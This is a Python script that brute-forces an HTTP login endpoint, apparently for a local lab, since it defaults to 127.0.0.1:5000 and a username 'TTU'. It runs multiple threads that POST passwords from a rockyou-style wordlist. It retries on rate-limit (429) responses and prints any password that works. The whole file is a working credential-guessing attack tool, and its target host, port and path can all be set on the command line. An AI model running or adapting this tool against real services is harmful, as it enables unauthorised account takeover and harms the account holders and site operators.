import argparse
import os
import requests
import time
import threading
from concurrent.futures import ThreadPoolExecutor
from requests.adapters import HTTPAdapter, Retry

URL = URL = os.getenv("BRUTE_FORCE_URL", "http://127.0.0.1:5000/login")
WORDLIST_PATH = os.getenv("BRUTE_FORCE_WORDLIST", "short_rock_you.txt")
THREADS = int(os.getenv("BRUTE_FORCE_THREADS", "10"))
FOUND = False
FOUND_PASSWORD = None

thread_local = threading.local()
lock = threading.Lock()

retry_strategy = Retry(
    total=3,
    connect=3,
    read=3,
    status=3,
    status_forcelist=[429, 500, 502, 503, 504],
    allowed_methods=["HEAD", "GET", "OPTIONS", "POST"],
    backoff_factor=1,
)

adapter = HTTPAdapter(max_retries=retry_strategy, pool_connections=THREADS, pool_maxsize=THREADS)

def get_session():
    if not hasattr(thread_local, 'session'):
        session = requests.Session()
        session.headers.update({'Connection': 'close'})
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        thread_local.session = session
    return thread_local.session

def is_success_response(response):
    try:
        data = response.json()
        if isinstance(data, dict) and 'success' in data:
            return bool(data['success'])
    except ValueError:
        pass

    if response.status_code != 200:
        return False

    body = response.text.lower()
    if any(word in body for word in ('invalid', 'incorrect', 'failed', 'error', 'try again', 'login failed', 'unauthorized')):
        return False

    return True


def attempt_password(password):
    global FOUND, FOUND_PASSWORD
    with lock:
        if FOUND:
            return

    payload = {"username": "TTU", "password": password}
    
    try:
        session = get_session()
        response = session.post(URL, json=payload, timeout=10)
        if is_success_response(response):
            with lock:
                if not FOUND:
                    FOUND = True
                    FOUND_PASSWORD = password
            print(f"\n[+] SUCCESS! Password found: {password}")
        else:
            print(f"[-] Tried {password}: status={response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"[!] request failed for {password}: {type(e).__name__}: {e}")
    except Exception as e:
        print(f"[!] unexpected error for {password}: {type(e).__name__}: {e}")

def run_test(target_url=None):
    global URL, FOUND
    if target_url:
        URL = target_url
    global FOUND
    print(f"[*] Starting multi-threaded attack with {THREADS} threads...")
    start_time = time.time()

    try:
        with open(WORDLIST_PATH, 'r', encoding='latin-1') as file:
            with ThreadPoolExecutor(max_workers=THREADS) as executor:
                for line in file:
                    if FOUND:
                        break

                    password = line.strip()
                    executor.submit(attempt_password, password)

    except FileNotFoundError:
        print("[-] Wordlist not found.")
        return

    if not FOUND:
        print("[-] Password not found.")
    
    end_time = time.time()
    print(f"[*] Finished in {end_time - start_time:.2f} seconds.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Brute force an HTTP /login endpoint.")
    parser.add_argument("--host", default="127.0.0.1", help="Target host")
    parser.add_argument("--port", default="5000", help="Target port")
    parser.add_argument("--path", default="/login", help="Login endpoint path")
    args = parser.parse_args()
    target_url = f"http://{args.host}:{args.port}{args.path}"
    run_test(target_url)